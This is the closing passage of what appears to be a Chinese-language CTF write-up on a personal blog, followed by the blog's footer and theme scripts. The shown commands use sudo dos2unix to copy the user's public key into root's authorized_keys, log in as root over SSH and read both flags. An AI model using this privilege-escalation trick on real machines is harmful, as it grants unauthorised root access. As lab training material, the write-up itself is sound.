+<span class="pl-s">|       o ..   = o|</span>
+<span class="pl-s">|      + S. o + O.|</span>
+<span class="pl-s">| .   o .  + o * o|</span>
+<span class="pl-s">|. o + .  ..E.o. .|</span>
+<span class="pl-s">| . o o    .o++oo+|</span>
+<span class="pl-s">|            +. .B|</span>
+<span class="pl-s">+----[SHA256]-----+</span>
+<span class="pl-s">a3170@Space:~$ cd .ssh</span>
+<span class="pl-s">a3170@Space:~/.ssh$ ls</span>
+<span class="pl-s">id_rsa  id_rsa.pub</span>
+<span class="pl-s">a3170@Space:~/.ssh$ sudo dos2unix -f -n "id_rsa.pub" "/root/.ssh/authorized_keys"</span>
+<span class="pl-s">dos2unix: converting file id_rsa.pub to file /root/.ssh/authorized_keys in Unix format...</span>
+<span class="pl-s">a3170@Space:~/.ssh$</span>
+<span class="pl-s">a3170@Space:~/.ssh$ ssh root@127.0.0.1</span>
+<span class="pl-s">Last login: Sat Jun 21 20:27:39 2025 from 192.168.3.94</span>
+<span class="pl-s">root@Space:~# id</span>
+<span class="pl-s">uid=0(root) gid=0(root) groups=0(root)</span></pre></div>
+<h5>拿到<code class="notranslate">root.txt</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)
+root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cd</span>
+root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ls</span>
+root.txt
+root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat root.txt</span>
+flag{root-f9f8c2ea-4f00-11f0-9724-e7b0f6215b99}
+root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /home/andeli/user.txt</span>
+flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://pingsag3.github.io">Pingsag3 Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","pingsag3/pingsag3.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
